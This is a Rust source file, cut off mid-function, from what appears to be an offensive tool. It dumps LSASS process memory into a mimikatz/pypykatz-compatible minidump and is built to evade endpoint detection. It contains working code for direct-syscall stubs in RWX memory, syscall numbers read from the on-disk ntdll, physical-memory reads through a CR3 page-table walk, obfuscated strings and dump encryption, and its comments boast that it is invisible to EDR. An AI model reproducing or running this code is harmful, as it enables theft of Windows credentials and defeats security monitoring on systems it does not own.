//! Hand-crafted minidump builder via NtReadVirtualMemory
//!
//! Builds a minimal minidump compatible with pypykatz/mimikatz containing:
//! - SystemInfoStream: OS version, processor info
//! - ModuleListStream: LSASS loaded DLLs (names, base addresses, sizes)
//! - Memory64ListStream: Full committed memory regions
//!
//! Avoids MiniDumpWriteDump entirely — uses only NtReadVirtualMemory.

use crate::crypto;
use crate::resolver::{self, ApiResolver};
use windows::Win32::Foundation::*;
use windows::Win32::System::Memory::*;
use windows::Win32::System::SystemInformation::*;
use windows::Win32::System::Threading::*;

// --- Minidump format constants ---
const MINIDUMP_SIGNATURE: u32 = 0x504D444D; // "MDMP"
const MINIDUMP_VERSION: u32 = 0xA793; // (42899)

// Stream types
const SYSTEM_INFO_STREAM: u32 = 7;
const MODULE_LIST_STREAM: u32 = 4;
const MEMORY_64_LIST_STREAM: u32 = 9;

// --- Minidump structures ---

#[repr(C, packed)]
#[derive(Clone, Copy)]
struct MinidumpHeader {
    signature: u32,
    version: u32,
    number_of_streams: u32,
    stream_directory_rva: u32,
    checksum: u32,
    timestamp: u32,
    flags: u64,
}

#[repr(C, packed)]
#[derive(Clone, Copy, Default)]
struct MinidumpDirectory {
    stream_type: u32,
    data_size: u32,
    rva: u32,
}

#[repr(C, packed)]
#[derive(Clone, Copy, Default)]
struct MinidumpSystemInfo {
    processor_architecture: u16,
    processor_level: u16,
    processor_revision: u16,
    number_of_processors: u8,
    product_type: u8,
    major_version: u32,
    minor_version: u32,
    build_number: u32,
    platform_id: u32, // VER_PLATFORM_WIN32_NT = 2
    csd_version_rva: u32,
    suite_mask: u16,
    reserved2: u16,
    // CPU info (simplified — 24 bytes)
    cpu_info: [u8; 24],
}

#[repr(C, packed)]
#[derive(Clone, Copy)]
struct MinidumpModule {
    base_of_image: u64,
    size_of_image: u32,
    checksum: u32,
    time_date_stamp: u32,
    module_name_rva: u32,
    version_info: [u8; 52], // VS_FIXEDFILEINFO
    cv_record: LocationDescriptor,
    misc_record: LocationDescriptor,
    reserved0: u64,
    reserved1: u64,
}

impl Default for MinidumpModule {
    fn default() -> Self {
        MinidumpModule {
            base_of_image: 0,
            size_of_image: 0,
            checksum: 0,
            time_date_stamp: 0,
            module_name_rva: 0,
            version_info: [0u8; 52],
            cv_record: LocationDescriptor::default(),
            misc_record: LocationDescriptor::default(),
            reserved0: 0,
            reserved1: 0,
        }
    }
}

#[repr(C, packed)]
#[derive(Clone, Copy, Default)]
struct LocationDescriptor {
    data_size: u32,
    rva: u32,
}

#[repr(C, packed)]
#[derive(Clone, Copy, Default)]
struct MinidumpMemoryDescriptor64 {
    start_of_memory_range: u64,
    data_size: u64,
}

/// Memory region info collected from the target process
struct MemRegion {
    base: u64,
    size: u64,
    data: Vec<u8>,
}

/// Module info collected from the target process
struct ModuleInfo {
    base: u64,
    size: u32,
    name: String,
}

/// Create a minidump of the target process
pub fn create_minidump(
    api: &ApiResolver,
    process: HANDLE,
    _pid: u32,
    output_path: &str,
    encrypt: bool,
) -> Result<u64, String> {
    // 1. Get system info
    println!("    Collecting system info...");
    let sys_info = collect_system_info();

    // 2. Enumerate loaded modules in target process
    println!("    Enumerating modules...");
    let modules =
        enumerate_modules(process, api).map_err(|e| format!("Module enumeration failed: {}", e))?;
    println!("    Found {} modules", modules.len());

    // 3. Read committed memory regions
    println!("    Reading memory regions (this may take a moment)...");
    let regions =
        read_memory_regions(api, process).map_err(|e| format!("Memory read failed: {}", e))?;

    let total_mem: u64 = regions.iter().map(|r| r.size).sum();
    println!(
        "    Read {} regions, {:.2} MB total",
        regions.len(),
        total_mem as f64 / 1048576.0
    );

    // 4. Build minidump
    println!("    Assembling minidump...");
    let mut dump = build_minidump(&sys_info, &modules, &regions);

    // 5. Optionally encrypt
    if encrypt {
        println!("    Encrypting dump...");
        dump = crypto::encrypt_dump(&mut dump);
    }

    // 6. Write to disk
    let dump_size = dump.len() as u64;
    std::fs::write(output_path, &dump).map_err(|e| format!("Failed to write dump: {}", e))?;

    Ok(dump_size)
}

/// Create minidump via physical memory reads — bypasses NtReadVirtualMemory entirely.
///
/// Uses CR3 page table walk to translate VAs to physical addresses,
/// then reads physical memory directly via the driver engine.
pub fn create_minidump_phys<F>(
    api: &ApiResolver,
    process: HANDLE,
    cr3: u64,
    read_phys: &F,
    output_path: &str,
    encrypt: bool,
) -> Result<u64, String>
where
    F: Fn(u64, &mut [u8]) -> Result<(), String>,
{
    // 1. Get system info
    println!("    Collecting system info...");
    let sys_info = collect_system_info();

    // 2. Enumerate loaded modules (uses NtQueryVirtualMemory — dynamic, not NtReadVirtualMemory)
    println!("    Enumerating modules...");
    let modules =
        enumerate_modules(process, api).map_err(|e| format!("Module enumeration failed: {}", e))?;
    println!("    Found {} modules", modules.len());

    // 3. Read memory via physical memory (page table walk — bypasses all user-mode hooks)
    println!("    Reading memory regions via physical memory...");
    let regions = read_memory_regions_phys(api, process, cr3, read_phys)
        .map_err(|e| format!("Physical memory read failed: {}", e))?;

    let total_mem: u64 = regions.iter().map(|r| r.size).sum();
    println!(
        "    Read {} regions, {:.2} MB total",
        regions.len(),
        total_mem as f64 / 1048576.0
    );

    // 4. Build minidump
    println!("    Assembling minidump...");
    let mut dump = build_minidump(&sys_info, &modules, &regions);

    // 5. Optionally encrypt
    if encrypt {
        println!("    Encrypting dump...");
        dump = crypto::encrypt_dump(&mut dump);
    }

    // 6. Write to disk
    let dump_size = dump.len() as u64;
    std::fs::write(output_path, &dump).map_err(|e| format!("Failed to write dump: {}", e))?;

    Ok(dump_size)
}

/// Create minidump with ZERO user-mode ntdll calls.
///
/// - Module enumeration: reads LSASS PEB → LDR chain via physical memory (CR3)
/// - Memory region enumeration: kernel-mode ZwQueryVirtualMemory (via trampoline)
/// - Memory data read: physical memory (CR3 page table walk)
///
/// The only remaining user-mode operations are `collect_system_info()` (reads
/// KUSER_SHARED_DATA + GetSystemInfo) and `std::fs::write()` (file I/O).
pub fn create_minidump_full_phys<F>(
    engine: &crate::winio64::DmEngine,
    process: HANDLE,
    pid: u32,
    cr3: u64,
    read_phys: &F,
    output_path: &str,
    encrypt: bool,
) -> Result<u64, String>
where
    F: Fn(u64, &mut [u8]) -> Result<(), String>,
{
    // 1. Get system info (reads KUSER_SHARED_DATA — no ntdll, no hook)
    println!("    Collecting system info...");
    let sys_info = collect_system_info();

    // 2. Enumerate modules via physical memory (PEB → LDR, zero ntdll calls)
    println!("    Enumerating modules via physical memory...");
    let modules = enumerate_modules_phys(engine, pid, cr3, read_phys)
        .map_err(|e| format!("Module enumeration (phys) failed: {}", e))?;
    println!("    Found {} modules", modules.len());

    // 3. Enumerate memory regions via direct syscall + hybrid read
    println!("    Enumerating regions via direct syscall (hybrid read)...");
    let regions = read_memory_regions_direct_syscall(process, cr3, read_phys)
        .map_err(|e| format!("Direct syscall region enum failed: {}", e))?;

    let total_mem: u64 = regions.iter().map(|r| r.size).sum();
    println!(
        "    Read {} regions, {:.2} MB total",
        regions.len(),
        total_mem as f64 / 1048576.0
    );

    // 4. Build minidump
    println!("    Assembling minidump...");
    let mut dump = build_minidump(&sys_info, &modules, &regions);

    // 5. Optionally encrypt
    if encrypt {
        println!("    Encrypting dump...");
        dump = crypto::encrypt_dump(&mut dump);
    }

    // 6. Write to disk
    let dump_size = dump.len() as u64;
    std::fs::write(output_path, &dump).map_err(|e| format!("Failed to write dump: {}", e))?;

    Ok(dump_size)
}

/// Enumerate LSASS modules via physical memory — zero ntdll calls.
///
/// Reads the target process PEB → Ldr → InLoadOrderModuleList chain
/// entirely through CR3 page-table translation + physical memory reads.
fn enumerate_modules_phys<F>(
    engine: &crate::winio64::DmEngine,
    pid: u32,
    cr3: u64,
    read_phys: &F,
) -> Result<Vec<ModuleInfo>, String>
where
    F: Fn(u64, &mut [u8]) -> Result<(), String>,
{
    let mut modules_out = Vec::new();

    // 1. Get PEB VA via kernel-mode PsGetProcessPeb
    let peb_va = engine.get_process_peb(pid)?;
    println!("    [phys] PEB at VA 0x{:X}", peb_va);

    // 2. Read PEB.Ldr (offset 0x18 on x64)
    let ldr_va = read_u64_via_phys(cr3, peb_va + 0x18, read_phys)?;
    if ldr_va == 0 || ldr_va < 0x10000 {
        return Err(format!("Invalid PEB.Ldr: 0x{:X}", ldr_va));
    }
    println!("    [phys] PEB_LDR_DATA at 0x{:X}", ldr_va);

    // 3. Read InLoadOrderModuleList.Flink (offset 0x10 in PEB_LDR_DATA)
    let list_head_va = ldr_va + 0x10; // &InLoadOrderModuleList
    let first_entry = read_u64_via_phys(cr3, list_head_va, read_phys)?;
    if first_entry == 0 {
        return Err("InLoadOrderModuleList.Flink is NULL".into());
    }

    // 4. Walk the doubly-linked list
    let mut current = first_entry;
    let mut iterations = 0u32;

    loop {
        if iterations > 512 {
            break; // safety limit
        }
        iterations += 1;

        // current points to the InLoadOrderLinks field (offset 0x0 of LDR_DATA_TABLE_ENTRY)
        // Check if we've looped back to list_head
        if current == list_head_va && iterations > 1 {
            break;
        }

        // LDR_DATA_TABLE_ENTRY layout (x64):
        //   0x00: InLoadOrderLinks (LIST_ENTRY: Flink, Blink = 16 bytes)
        //   0x10: InMemoryOrderLinks
        //   0x20: InInitializationOrderLinks
        //   0x30: DllBase (PVOID)
        //   0x38: EntryPoint (PVOID)
        //   0x40: SizeOfImage (ULONG)
        //   0x48: FullDllName (UNICODE_STRING: Length u16, MaxLength u16, pad u32, Buffer *u16)
        //   0x58: BaseDllName (UNICODE_STRING)
        //   0x80: TimeDateStamp (ULONG)

        // Read DllBase
        let dll_base = match read_u64_via_phys(cr3, current + 0x30, read_phys) {
            Ok(v) => v,
            Err(_) => {
                // Try next entry
                current = match read_u64_via_phys(cr3, current, read_phys) {
                    Ok(v) => v,
                    Err(_) => break,
                };
                continue;
            }
        };

        if dll_base == 0 {
            // Skip empty entries, advance to next
            current = match read_u64_via_phys(cr3, current, read_phys) {
                Ok(v) => v,
                Err(_) => break,
            };
            continue;
        }

        // Read SizeOfImage
        let size_of_image = match read_u32_via_phys(cr3, current + 0x40, read_phys) {
            Ok(v) => v,
            Err(_) => 0,
        };

        // Read FullDllName UNICODE_STRING
        let name = read_unicode_string_phys(cr3, current + 0x48, read_phys)
            .unwrap_or_else(|_| format!("unknown_{:X}", dll_base));

        // Convert NT device path to DOS path if needed
        let name = if name.starts_with("\\") {
            nt_device_path_to_dos(&name)
        } else {
            name
        };

        modules_out.push(ModuleInfo {
            base: dll_base,
            size: size_of_image,
            name,
        });

        // Advance: read Flink (offset 0x0)
        current = match read_u64_via_phys(cr3, current, read_phys) {
            Ok(v) => v,
            Err(_) => break,
        };
        if current == first_entry || current == list_head_va {
            break; // full circle
        }
    }

    if modules_out.is_empty() {
        return Err("No modules found via physical memory walk".into());
    }

    Ok(modules_out)
}
/// Enumerate committed memory regions via DIRECT SYSCALLS (no ntdll hooks),
/// read data via HYBRID approach: CR3 physical read first, NtReadVirtualMemory
/// syscall fallback only for paged-out pages.
///
/// 1. Reads ntdll.dll from DISK to get clean syscall numbers
/// 2. Builds fresh syscall stubs in RWX memory — EDR hooks never fire
/// 3. Enumerates regions with NtQueryVirtualMemory syscall
/// 4. For each page: try CR3 physical read (invisible to EDR) first;
///    only fall back to NtReadVirtualMemory for paged-out pages (~40%)
fn read_memory_regions_direct_syscall<F>(
    process: HANDLE,
    cr3: u64,
    read_phys: &F,
) -> Result<Vec<MemRegion>, String>
where
    F: Fn(u64, &mut [u8]) -> Result<(), String>,
{
    // 1. Get syscall numbers from clean on-disk ntdll
    let ssn_query = get_syscall_number("NtQueryVirtualMemory")?;
    let ssn_read = get_syscall_number("NtReadVirtualMemory")?;
    println!("    [syscall] NtQueryVirtualMemory SSN: 0x{:X}", ssn_query);
    println!("    [syscall] NtReadVirtualMemory  SSN: 0x{:X}", ssn_read);

    // 2. Build both syscall stubs in a single RWX page
    let build_stub = |ssn: u32| -> [u8; 12] {
        [
            0x4C, 0x8B, 0xD1,                           // mov r10, rcx
            0xB8,                                        // mov eax, <SSN>
            (ssn & 0xFF) as u8,
            ((ssn >> 8) & 0xFF) as u8,
            ((ssn >> 16) & 0xFF) as u8,
            ((ssn >> 24) & 0xFF) as u8,
            0x0F, 0x05,                                  // syscall
            0xC3,                                        // ret
            0x90,                                        // nop
        ]
    };

    let stub_page = unsafe {
        windows::Win32::System::Memory::VirtualAlloc(
            None,
            0x1000,
            windows::Win32::System::Memory::MEM_COMMIT
                | windows::Win32::System::Memory::MEM_RESERVE,
            windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE,
        )
    };
    if stub_page.is_null() {
        return Err("VirtualAlloc for syscall stubs failed".into());
    }

    let query_stub = build_stub(ssn_query);
    let read_stub = build_stub(ssn_read);
    unsafe {
        std::ptr::copy_nonoverlapping(query_stub.as_ptr(), stub_page as *mut u8, 12);
        std::ptr::copy_nonoverlapping(
            read_stub.as_ptr(),
            (stub_page as *mut u8).add(0x10),
            12,
        );
    }

    // 3. Cast to function pointers
    type FnNtQueryVirtualMemory =
        unsafe extern "system" fn(isize, *const u8, u32, *mut u8, usize, *mut usize) -> i32;
    type FnNtReadVirtualMemory =
        unsafe extern "system" fn(isize, *const u8, *mut u8, usize, *mut usize) -> i32;

    let nt_query_vm: FnNtQueryVirtualMemory = unsafe { std::mem::transmute(stub_page) };
    let nt_read_vm: FnNtReadVirtualMemory =
        unsafe { std::mem::transmute((stub_page as *const u8).add(0x10)) };

    // 4. Enumerate regions and read page-by-page (hybrid)
    #[repr(C)]
    #[derive(Default)]
    struct MemBasicInfo {
        base_address: u64,
        allocation_base: u64,
        allocation_protect: u32,
        _pad1: u32,
        region_size: u64,
        state: u32,
        protect: u32,
        type_: u32,
        _pad2: u32,
    }

    let mut regions = Vec::new();
    let mut address: u64 = 0;
    let mut pages_phys: u64 = 0;   // pages read via physical memory
    let mut pages_syscall: u64 = 0; // pages read via NtReadVirtualMemory fallback

    loop {
        let mut mbi = MemBasicInfo::default();
        let mut ret_len = 0usize;
        let status = unsafe {
            nt_query_vm(
                process.0 as isize,
                address as *const u8,
                0, // MemoryBasicInformation
                &mut mbi as *mut _ as *mut u8,
                std::mem::size_of::<MemBasicInfo>(),
                &mut ret_len,
            )
        };

        if status < 0 || ret_len == 0 {
            break;
        }

        // MEM_COMMIT=0x1000, readable and not guarded
        let protect = mbi.protect;
        if mbi.state == 0x1000
            && (protect == 0x02
                || protect == 0x04
                || protect == 0x08
                || protect == 0x20
                || protect == 0x40
                || protect == 0x80)
            && protect & 0x100 == 0
        {
            let region_size = mbi.region_size as usize;
            let mut buffer = vec![0u8; region_size];
            let mut offset = 0usize;

            // Read page-by-page: CR3 physical first, syscall fallback
            while offset < region_size {
                let page_va = mbi.base_address + offset as u64;
                let page_offset_in_page = (page_va & 0xFFF) as usize;
                let chunk_size = std::cmp::min(0x1000 - page_offset_in_page, region_size - offset);

                // Try 1: Physical memory via CR3 page table walk (invisible to EDR)
                let phys_ok = if let Ok(pa) = translate_va_to_pa(cr3, page_va, read_phys) {
                    read_phys(pa, &mut buffer[offset..offset + chunk_size]).is_ok()
                } else {
                    false
                };

                if phys_ok {
                    pages_phys += 1;
                } else {
                    // Try 2: NtReadVirtualMemory syscall fallback (only for paged-out pages)
                    let mut page_read = 0usize;
                    let read_status = unsafe {
                        nt_read_vm(
                            process.0 as isize,
                            page_va as *const u8,
                            buffer[offset..].as_mut_ptr(),
                            chunk_size,
                            &mut page_read,
                        )
                    };
                    if read_status >= 0 && page_read > 0 {
                        pages_syscall += 1;
                    }
                    // If both fail, leave zeros (truly inaccessible page)
                }

                offset += chunk_size;
            }

            if buffer.iter().any(|&b| b != 0) {
                regions.push(MemRegion {
                    base: mbi.base_address,
                    size: buffer.len() as u64,
                    data: buffer,
                });
            }
        }

        address = mbi.base_address + mbi.region_size;
        if address == 0 {
            break;
        }
    }

    // 5. Free the stubs
    unsafe {
        let _ = windows::Win32::System::Memory::VirtualFree(
            stub_page,
            0,
            windows::Win32::System::Memory::MEM_RELEASE,
        );
    }

    let total_pages = pages_phys + pages_syscall;
    if total_pages > 0 {
        println!(
            "    [hybrid] {} pages via phys ({:.1}%), {} pages via syscall ({:.1}%)",
            pages_phys,
            100.0 * pages_phys as f64 / total_pages as f64,
            pages_syscall,
            100.0 * pages_syscall as f64 / total_pages as f64,
        );
    }

    if regions.is_empty() {
        return Err("No readable memory regions found via direct syscall".into());
    }

    Ok(regions)
}

/// Extract a syscall number (SSN) from the on-disk ntdll.dll.
///
/// Reads the clean copy from C:\Windows\System32\ntdll.dll, finds the
/// export, and reads the `mov eax, <SSN>` instruction from the stub.
/// This avoids any in-memory hooks placed by EDRs.
fn get_syscall_number(func_name: &str) -> Result<u32, String> {
    let path = obfstr::obfstr!("C:\\Windows\\System32\\ntdll.dll").to_string();
    let data = std::fs::read(&path).map_err(|e| format!("Read ntdll failed: {}", e))?;

    let rva = find_ntdll_export_rva(&data, func_name)?;
    let file_offset = rva_to_file_offset_ntdll(&data, rva)?;

    // Verify stub pattern: 4C 8B D1 B8 xx xx xx xx
    if file_offset + 8 > data.len() {
        return Err("Stub too short".into());
    }
    if data[file_offset] == 0x4C
        && data[file_offset + 1] == 0x8B
        && data[file_offset + 2] == 0xD1
        && data[file_offset + 3] == 0xB8
    {
        let ssn = u32::from_le_bytes(
            data[file_offset + 4..file_offset + 8]
                .try_into()
                .unwrap(),
        );
        Ok(ssn)
    } else {
        Err(format!(
            "Not a valid syscall stub at RVA 0x{:X}: {:02X} {:02X} {:02X} {:02X}",
            rva,
            data[file_offset],
            data[file_offset + 1],
            data[file_offset + 2],
            data[file_offset + 3],
        ))
    }
}

/// Find an exported function RVA in the ntdll PE data (from disk).
fn find_ntdll_export_rva(data: &[u8], func_name: &str) -> Result<u32, String> {
    let pe_off = u32::from_le_bytes(data[0x3C..0x40].try_into().unwrap()) as usize;
    let opt_off = pe_off + 24;
    let export_rva =
        u32::from_le_bytes(data[opt_off + 112..opt_off + 116].try_into().unwrap()) as usize;
    let export_size =
        u32::from_le_bytes(data[opt_off + 116..opt_off + 120].try_into().unwrap()) as usize;

    if export_rva == 0 {
        return Err("No export directory in ntdll".into());
    }

    let num_sections =
        u16::from_le_bytes(data[pe_off + 6..pe_off + 8].try_into().unwrap()) as usize;
    let opt_hdr_size =
        u16::from_le_bytes(data[pe_off + 20..pe_off + 22].try_into().unwrap()) as usize;
    let sections_off = pe_off + 24 + opt_hdr_size;

    let rva_to_offset = |rva: usize| -> Option<usize> {
        for i in 0..num_sections {
            let s = sections_off + i * 40;
            let vaddr = u32::from_le_bytes(data[s + 12..s + 16].try_into().unwrap()) as usize;
            let vsize = u32::from_le_bytes(data[s + 8..s + 12].try_into().unwrap()) as usize;
            let raw_off = u32::from_le_bytes(data[s + 20..s + 24].try_into().unwrap()) as usize;
            if rva >= vaddr && rva < vaddr + vsize {
                return Some(raw_off + (rva - vaddr));
            }
        }
        None
    };

    let exp_off = rva_to_offset(export_rva).ok_or("map export dir RVA")?;
    let num_names =
        u32::from_le_bytes(data[exp_off + 24..exp_off + 28].try_into().unwrap()) as usize;
    let addr_table_rva =
        u32::from_le_bytes(data[exp_off + 28..exp_off + 32].try_into().unwrap()) as usize;
    let name_table_rva =
        u32::from_le_bytes(data[exp_off + 32..exp_off + 36].try_into().unwrap()) as usize;
    let ord_table_rva =
        u32::from_le_bytes(data[exp_off + 36..exp_off + 40].try_into().unwrap()) as usize;

    let name_table_off = rva_to_offset(name_table_rva).ok_or("map name table")?;
    let ord_table_off = rva_to_offset(ord_table_rva).ok_or("map ord table")?;
    let addr_table_off = rva_to_offset(addr_table_rva).ok_or("map addr table")?;

    for i in 0..num_names {
        let name_rva = u32::from_le_bytes(
            data[name_table_off + i * 4..name_table_off + i * 4 + 4]
                .try_into()
                .unwrap(),
        ) as usize;
        let name_off = match rva_to_offset(name_rva) {
            Some(o) => o,
            None => continue,
        };
        let end = data[name_off..]
            .iter()
            .position(|&b| b == 0)
            .unwrap_or(256);
        let name = std::str::from_utf8(&data[name_off..name_off + end]).unwrap_or("");

        if name == func_name {
            let ordinal = u16::from_le_bytes(
                data[ord_table_off + i * 2..ord_table_off + i * 2 + 2]
                    .try_into()
                    .unwrap(),
            ) as usize;
            let func_rva = u32::from_le_bytes(
                data[addr_table_off + ordinal * 4..addr_table_off + ordinal * 4 + 4]
                    .try_into()
                    .unwrap(),
            );
            if (func_rva as usize) >= export_rva && (func_rva as usize) < export_rva + export_size
            {
                return Err(format!("{} is forwarded", func_name));
            }
            return Ok(func_rva);
        }
    }
    Err(format!("'{}' not found in ntdll exports", func_name))
}

/// Convert an RVA to a file offset using ntdll PE section headers.
fn rva_to_file_offset_ntdll(data: &[u8], rva: u32) -> Result<usize, String> {
    let pe_off = u32::from_le_bytes(data[0x3C..0x40].try_into().unwrap()) as usize;
    let num_sections =
        u16::from_le_bytes(data[pe_off + 6..pe_off + 8].try_into().unwrap()) as usize;
    let opt_hdr_size =
        u16::from_le_bytes(data[pe_off + 20..pe_off + 22].try_into().unwrap()) as usize;
    let sections_off = pe_off + 24 + opt_hdr_size;

    for i in 0..num_sections {
        let s = sections_off + i * 40;
        let vaddr = u32::from_le_bytes(data[s + 12..s + 16].try_into().unwrap()) as usize;
        let vsize = u32::from_le_bytes(data[s + 8..s + 12].try_into().unwrap()) as usize;
        let raw_off = u32::from_le_bytes(data[s + 20..s + 24].try_into().unwrap()) as usize;
        if (rva as usize) >= vaddr && (rva as usize) < vaddr + vsize {
            return Ok(raw_off + (rva as usize - vaddr));
        }
    }
    Err(format!("RVA 0x{:X} not in any section", rva))
}
/// Translate virtual address to physical address via x64 4-level page table walk.
///
/// CR3 → PML4 → PDPT → PD → PT → Physical Page
/// Supports 4KB pages, 2MB large pages, and 1GB huge pages.
fn read_u64_via_phys<F>(cr3: u64, va: u64, read_phys: &F) -> Result<u64, String>
where
    F: Fn(u64, &mut [u8]) -> Result<(), String>,
{
    let pa = translate_va_to_pa(cr3, va, read_phys)?;
    let mut buf = [0u8; 8];
    read_phys(pa, &mut buf)?;
    Ok(u64::from_le_bytes(buf))
}

fn read_u32_via_phys<F>(cr3: u64, va: u64, read_phys: &F) -> Result<u32, String>
where
    F: Fn(u64, &mut [u8]) -> Result<(), String>,
{
    let pa = translate_va_to_pa(cr3, va, read_phys)?;
    let mut buf = [0u8; 4];
    read_phys(pa, &mut buf)?;
    Ok(u32::from_le_bytes(buf))
}

fn read_unicode_string_phys<F>(cr3: u64, va: u64, read_phys: &F) -> Result<String, String>
where
    F: Fn(u64, &mut [u8]) -> Result<(), String>,
{
    // UNICODE_STRING (x64): len u16 @ +0, max_len u16 @ +2, _pad u32 @ +4, buffer *u16 @ +8
    let len = {
        let pa = translate_va_to_pa(cr3, va, read_phys)?;
        let mut buf = [0u8; 2];
        read_phys(pa, &mut buf)?;
        u16::from_le_bytes(buf) as usize
    };
    if len == 0 || len > 1024 {
        return Err("Invalid UNICODE_STRING length".into());
    }
    let buffer_ptr = read_u64_via_phys(cr3, va + 8, read_phys)?;
    if buffer_ptr == 0 {
        return Err("NULL UNICODE_STRING buffer".into());
    }

    let mut raw = vec![0u8; len];
    let mut offset = 0;
    while offset < len {
        let chunk_va = buffer_ptr + offset as u64;
        let page_off = (chunk_va & 0xFFF) as usize;
        let chunk_size = std::cmp::min(0x1000 - page_off, len - offset);
        if let Ok(pa) = translate_va_to_pa(cr3, chunk_va, read_phys) {
            let _ = read_phys(pa, &mut raw[offset..offset + chunk_size]);
        }
        offset += chunk_size;
    }

    let u16s: Vec<u16> = raw
        .chunks_exact(2)
        .map(|c| u16::from_le_bytes([c[0], c[1]]))
        .collect();
    Ok(String::from_utf16_lossy(&u16s))
}

/// Read a virtual memory region via physical memory using page table walk.
fn read_region_phys<F>(cr3: u64, va: u64, size: usize, read_phys: &F) -> Vec<u8>
where
    F: Fn(u64, &mut [u8]) -> Result<(), String>,
{
    let mut result = vec![0u8; size];
    let mut offset = 0usize;
    while offset < size {
        let current_va = va + offset as u64;
        let page_offset = (current_va & 0xFFF) as usize;
        let chunk_size = std::cmp::min(0x1000 - page_offset, size - offset);
        if let Ok(pa) = translate_va_to_pa(cr3, current_va, read_phys) {
            let _ = read_phys(pa, &mut result[offset..offset + chunk_size]);
        }
        offset += chunk_size;
    }
    result
}

/// Read committed memory regions via physical memory (sfdrv mode).
fn read_memory_regions_phys<F>(
    api: &ApiResolver,
    process: HANDLE,
    cr3: u64,
    read_phys: &F,
) -> Result<Vec<MemRegion>, String>
where
    F: Fn(u64, &mut [u8]) -> Result<(), String>,
{
    type FnNtQueryVirtualMemory =
        unsafe extern "system" fn(isize, *const u8, u32, *mut u8, usize, *mut usize) -> i32;
    let nt_query_vm: FnNtQueryVirtualMemory = unsafe {
        std::mem::transmute(
            api.ntdll(resolver::HASH_NT_QUERY_VIRTUAL_MEMORY)
                .ok_or("Failed to resolve NtQueryVirtualMemory")?,
        )
    };

    #[repr(C)]
    #[derive(Default)]
    struct MemBasicInfo {
        base_address: u64,
        allocation_base: u64,
        allocation_protect: u32,
        _pad1: u32,
        region_size: u64,
        state: u32,
        protect: u32,
        type_: u32,
        _pad2: u32,
    }

    let mut regions = Vec::new();
    let mut address: u64 = 0;

    loop {
        let mut mbi = MemBasicInfo::default();
        let mut ret_len = 0usize;
        let status = unsafe {
            nt_query_vm(
                process.0 as isize,
                address as *const u8,
                0,
                &mut mbi as *mut _ as *mut u8,
                std::mem::size_of::<MemBasicInfo>(),
                &mut ret_len,
            )
        };
        if status < 0 || ret_len == 0 {
            break;
        }
        let protect = mbi.protect;
        if mbi.state == 0x1000
            && (protect == 0x02 || protect == 0x04 || protect == 0x08
                || protect == 0x20 || protect == 0x40 || protect == 0x80)
            && protect & 0x100 == 0
        {
            let region_size = mbi.region_size as usize;
            let data = read_region_phys(cr3, mbi.base_address, region_size, read_phys);
            if data.iter().any(|&b| b != 0) {
                regions.push(MemRegion {
                    base: mbi.base_address,
                    size: data.len() as u64,
                    data,
                });
            }
        }
        address = mbi.base_address + mbi.region_size;
        if address == 0 { break; }
    }

    if regions.is_empty() {
        return Err("No readable memory regions found via physical memory".into());
    }
    Ok(regions)
}

/// Translate virtual address to physical address via CR3 page table walk.
fn translate_va_to_pa<F>(cr3: u64, va: u64, read_phys: &F) -> Result<u64, String>
where
    F: Fn(u64, &mut [u8]) -> Result<(), String>,
{
    let mut entry = [0u8; 8];

    // PML4
    let pml4_idx = ((va >> 39) & 0x1FF) as u64;
    read_phys((cr3 & 0x000F_FFFF_FFFF_F000) + pml4_idx * 8, &mut entry)?;
    let pml4e = u64::from_le_bytes(entry);
    if pml4e & 1 == 0 {
        return Err("PML4E not present".into());
    }

    // PDPT
    let pdpt_idx = ((va >> 30) & 0x1FF) as u64;
    read_phys((pml4e & 0x000F_FFFF_FFFF_F000) + pdpt_idx * 8, &mut entry)?;
    let pdpte = u64::from_le_bytes(entry);
    if pdpte & 1 == 0 {
        return Err("PDPTE not present".into());
    }
    if pdpte & 0x80 != 0 {
        // 1GB huge page
        return Ok((pdpte & 0x000F_FFFF_C000_0000) | (va & 0x3FFF_FFFF));
    }

    // PD
    let pd_idx = ((va >> 21) & 0x1FF) as u64;
    read_phys((pdpte & 0x000F_FFFF_FFFF_F000) + pd_idx * 8, &mut entry)?;
    let pde = u64::from_le_bytes(entry);
    if pde & 1 == 0 {
        return Err("PDE not present".into());
    }
    if pde & 0x80 != 0 {
        // 2MB large page
        return Ok((pde & 0x000F_FFFF_FFE0_0000) | (va & 0x1F_FFFF));
    }

    // PT
    let pt_idx = ((va >> 12) & 0x1FF) as u64;
    read_phys((pde & 0x000F_FFFF_FFFF_F000) + pt_idx * 8, &mut entry)?;
    let pte = u64::from_le_bytes(entry);
    if pte & 1 == 0 {
        return Err("PTE not present".into());
    }

    Ok((pte & 0x000F_FFFF_FFFF_F000) | (va & 0xFFF))
}
fn collect_system_info() -> MinidumpSystemInfo {
    // Read OS version from KUSER_SHARED_DATA at 0x7FFE0000.
    // This is a kernel-mapped read-only page visible in user-mode.
    // CANNOT be hooked, shimmed, or lied about (unlike RtlGetVersion/GetVersionExW).
    //
    // Layout (stable since NT 4.0):
    //   +0x026C  NtMajorVersion  : u32
    //   +0x0270  NtMinorVersion  : u32
    //   +0x0260  NtBuildNumber   : u32  (low 16 bits = build number)
    //
    // This is the DEFINITIVE source of truth for OS version.
    let kuser: *const u8 = 0x7FFE0000usize as *const u8;

    let major = unsafe { *(kuser.add(0x026C) as *const u32) };
    let minor = unsafe { *(kuser.add(0x0270) as *const u32) };
    let build_raw = unsafe { *(kuser.add(0x0260) as *const u32) };
    let build = build_raw & 0xFFFF; // low 16 bits = build number

    println!(
        "    OS Version: {}.{} Build {} (from KUSER_SHARED_DATA)",
        major, minor, build
    );

    let mut sys = SYSTEM_INFO::default();
    unsafe {
        GetSystemInfo(&mut sys);
    }

    MinidumpSystemInfo {
        processor_architecture: unsafe { sys.Anonymous.Anonymous.wProcessorArchitecture.0 },
        processor_level: sys.wProcessorLevel,
        processor_revision: sys.wProcessorRevision,
        number_of_processors: sys.dwNumberOfProcessors as u8,
        product_type: 1, // VER_NT_WORKSTATION
        major_version: major,
        minor_version: minor,
        build_number: build,
        platform_id: 2, // VER_PLATFORM_WIN32_NT
        csd_version_rva: 0,
        suite_mask: 0,
        reserved2: 0,
        cpu_info: [0u8; 24],
    }
}

fn enumerate_modules(process: HANDLE, api: &ApiResolver) -> Result<Vec<ModuleInfo>, String> {
    let mut modules_out = Vec::new();
    let mut seen_bases = std::collections::HashSet::new();
    let mut address: u64 = 0;

    // Resolve NtQueryVirtualMemory dynamically (not in IAT)
    type FnNtQueryVirtualMemory = unsafe extern "system" fn(
        isize,      // ProcessHandle
        *const u8,  // BaseAddress
